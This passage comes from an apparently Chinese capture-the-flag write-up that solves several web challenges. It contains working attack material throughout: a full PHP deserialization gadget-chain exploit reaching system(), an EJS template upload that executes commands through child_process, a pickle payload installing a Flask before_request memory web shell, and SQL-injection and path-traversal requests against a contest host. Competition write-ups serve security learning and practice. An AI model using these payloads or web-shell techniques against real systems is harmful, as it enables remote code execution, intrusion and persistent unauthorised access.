+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">unserialize</span>($_POST[<span style="color:#e6db74">&#39;payload&#39;</span>]);
+</span></span></code></pre></div><p>入口点位于 <code>H.__destruct</code> ，出口点位于 <code>U.__invoke</code> ，可以从后往前构造链子</p>
+<p>当尝试以调用函数的方式调用一个对象时触发 <code>__invoke</code> 方法，所以 <code>F.check -&gt; U.__invoke</code>，利用php初始化类不区分大小写的特性绕过 <code>preg_match(&quot;/U/&quot;,$this-&gt;finalstep)</code> ，将finalstep置为小写u</p>
+<p>绕过这一个点后，后续很自然的能找到 <code>E.__get -&gt; F.check</code>， 访问不可访问或未定义的属性值时会触发 <code>__get</code> 方法，所以 <code>V.__toString -&gt; E.__get</code> ，而当反序列化后的对象被输出时会触发 <code>__toSring</code> 方法，因此 <code>A.start -&gt; V.__toString</code>，最后 <code>H.__destruct -&gt; A.start</code> 即可完成整条链的构造：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">H</span><span style="color:#f92672">.</span><span style="color:#a6e22e">__destruct</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">A</span><span style="color:#f92672">.</span><span style="color:#a6e22e">start</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">V</span><span style="color:#f92672">.</span><span style="color:#a6e22e">__toString</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">E</span><span style="color:#f92672">.</span><span style="color:#a6e22e">__get</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">F</span><span style="color:#f92672">.</span><span style="color:#a6e22e">check</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">U</span><span style="color:#f92672">.</span><span style="color:#a6e22e">__invoke</span>
+</span></span></code></pre></div><p>完整exp：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">A</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $first;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $step;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $next;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">start</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">next</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">E</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $you;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $found;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $secret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin123&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__get</span>($name){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>($name <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;secret&#34;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span><span style="color:#f92672">.</span>$name<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; maybe is here!&lt;/br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">found</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">check</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">F</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $fifth;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $step;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $finalstep;  <span style="color:#75715e">// u
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">check</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/U/&#34;</span>,$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">finalstep</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;仔细想想！&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">step</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">finalstep</span>();
+</span></span><span style="display:flex;"><span>            ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">step</span>)();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">H</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $who;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $are;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $you;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>() {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">you</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;nobody&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__destruct</span>() {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">who</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">start</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">N</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $congratulation;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $yougotit;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__call</span>(<span style="color:#a6e22e">string</span> $func_name, <span style="color:#66d9ef">array</span> $args) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">call_user_func</span>($func_name,$args[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">U</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $almost;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $there;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $cmd;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>() {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">there</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">N</span>();
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cmd</span> <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;cmd&#39;</span>]; 
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__invoke</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">there</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">system</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cmd</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">V</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $good;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $keep;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $dowhat;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $go;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__toString</span>() {
+</span></span><span style="display:flex;"><span>        $abc <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">dowhat</span>;
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">go</span><span style="color:#f92672">-&gt;</span>$abc;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&lt;br&gt;Win!!!&lt;/br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$f <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">F</span>();
+</span></span><span style="display:flex;"><span>$f<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">finalstep</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;u&#39;</span>;
+</span></span><span style="display:flex;"><span>$e <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">E</span>();
+</span></span><span style="display:flex;"><span>$e<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">found</span> <span style="color:#f92672">=</span> $f;
+</span></span><span style="display:flex;"><span>$v <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">V</span>();
+</span></span><span style="display:flex;"><span>$v<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">dowhat</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;secret&#39;</span>;
+</span></span><span style="display:flex;"><span>$v<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">go</span> <span style="color:#f92672">=</span> $e;
+</span></span><span style="display:flex;"><span>$a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">A</span>();
+</span></span><span style="display:flex;"><span>$a<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">next</span> <span style="color:#f92672">=</span> $v;
+</span></span><span style="display:flex;"><span>$h <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">H</span>();
+</span></span><span style="display:flex;"><span>$h<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">who</span> <span style="color:#f92672">=</span> $a;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>($h));
+</span></span></code></pre></div><p><img alt="alt" loading="lazy" src="/images/YCB2025/1.png"></p>
+<h2 id="staticnodeservice">staticNodeService<a hidden class="anchor" aria-hidden="true" href="#staticnodeservice">#</a></h2>
+<p>App.js：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ejs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;ejs&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;path&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">PORT</span> <span style="color:#f92672">=</span> parseInt(<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">PORT</span>) <span style="color:#f92672">||</span> <span style="color:#ae81ff">3000</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;view engine&#39;</span>, <span style="color:#e6db74">&#39;ejs&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">express</span>.<span style="color:#a6e22e">json</span>({
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">limit</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;1mb&#39;</span>
+</span></span><span style="display:flex;"><span>}));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">STATIC_DIR</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">__dirname</span>, <span style="color:#e6db74">&#39;/&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// serve index for better viewing
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">serveIndex</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">templ</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">templ</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;index&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">lsPath</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">__dirname</span>, <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">path</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#a6e22e">templ</span>, {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">filenames</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readdirSync</span>(<span style="color:#a6e22e">lsPath</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">path</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">path</span>
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">e</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;Error rendering page&#39;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// static serve for simply view/download
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">express</span>.<span style="color:#66d9ef">static</span>(<span style="color:#a6e22e">STATIC_DIR</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Security middleware
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>((<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">path</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;string&#39;</span> <span style="color:#f92672">||</span> 
+</span></span><span style="display:flex;"><span>            (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">templ</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;string&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">templ</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;undefined&#39;</span>)
+</span></span><span style="display:flex;"><span>        ) <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;Error parsing path&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#e6db74">/js$|\.\./i</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">path</span>)) <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">403</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;Denied filename&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">next</span>();
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// logic middleware
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>((<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">endsWith</span>(<span style="color:#e6db74">&#39;/&#39;</span>)) <span style="color:#a6e22e">serveIndex</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">next</span>();
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Upload operation handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#39;/*&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">filePath</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">STATIC_DIR</span>, <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">path</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">existsSync</span>(<span style="color:#a6e22e">filePath</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;File already exists&#39;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">writeFile</span>(<span style="color:#a6e22e">filePath</span>, <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">content</span>, <span style="color:#e6db74">&#39;base64&#39;</span>), (<span style="color:#a6e22e">err</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;Error writing file&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">201</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;File created/updated&#39;</span>);
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Server start
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#a6e22e">PORT</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Static server is running on http://localhost:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">PORT</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>默认使用 <code>index.ejs</code> 作为模板进行渲染，<code>STATIC_DIR</code> 设置 <code>/App</code> 为根目录，对参数 <code>templ</code> 无任何限制，考虑上传ejs文件命令执行</p>
+<p>上传文件 <code>readflag.ejs/.</code> 可以同时绕过 <code>req.path.endsWith('/')</code> 以及 <code>else if (/js$|\.\./i.test(req.path))</code> ，文件内容进行base64编码：</p>
+<pre tabindex="0"><code>&lt;%- global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;/readflag&#39;) %&gt;
+PCUtIGdsb2JhbC5wcm9jZXNzLm1haW5Nb2R1bGUucmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCcvcmVhZGZsYWcnKSAlPg==
+</code></pre><p><img alt="alt" loading="lazy" src="/images/YCB2025/2.png"></p>
+<p>传参 <code>?templ=../readflag</code> 来渲染 <code>readflag.ejs</code>执行/readflag获取flag：</p>
+<p><img alt="alt" loading="lazy" src="/images/YCB2025/3.png"></p>
+<h2 id="ezblog">ezBlog<a hidden class="anchor" aria-hidden="true" href="#ezblog">#</a></h2>
+<p>提示用访客账号登录，猜测 <code>guest/guest</code> 登录成功，利用Token验证身份，Token是pickle序列化数据，一开始尝试将其中is_admin的值从False改为True，即0x89改为0x88，发现能以管理员账户登录，后续打SSTI发现失败：</p>
+<p><img alt="alt" loading="lazy" src="/images/YCB2025/4.png"></p>
+<p>考虑到题目环境使用Token来鉴权，可能是将Token直接反序列化了，打 before_request 内存马：</p>
+<pre tabindex="0"><code>cbuiltins
+eval
+(S&#39;app.before_request_funcs.setdefault(None,[]).append(lambda:__import__(\&#39;os\&#39;).popen(request.args.get(\&#39;cmd\&#39;)).read())&#39;
+tR.
+</code></pre><h2 id="ezsingin">Ezsingin<a hidden class="anchor" aria-hidden="true" href="#ezsingin">#</a></h2>
+<p>/login存在sql注入，获取Admin用户connect.sid：</p>
+<pre tabindex="0"><code>POST /login HTTP/1.1
+Host: 45.40.247.139:30096
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+If-None-Match: W/&#34;30c-DHNVxa0VphnTYJIjy4EiUOx4CDM&#34;
+Priority: u=0, i
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 32
+
+username=Admin&#34;)+--+q&amp;password=1
+</code></pre><p>/download存在文件读取：</p>
+<pre tabindex="0"><code>GET /download/?filename=../app.js HTTP/1.1
+Host: 45.40.247.139:30096
+Accept-Language: zh-CN,zh;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://45.40.247.139:30096/
+Accept-Encoding: gzip, deflate, br
+Cookie: connect.sid=s%3ArQORBzH5x3cMktwmh4bOVtqMfb4WblLh.G08Vr5WzTRGs3cu7MA5ssx%2Fkcg1HCxCOJ6ymIreM5nc
+Connection: keep-alive
+</code></pre><p>app.js：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">session</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express-session&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sqlite3</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;sqlite3&#39;</span>).<span style="color:#a6e22e">verbose</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;path&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
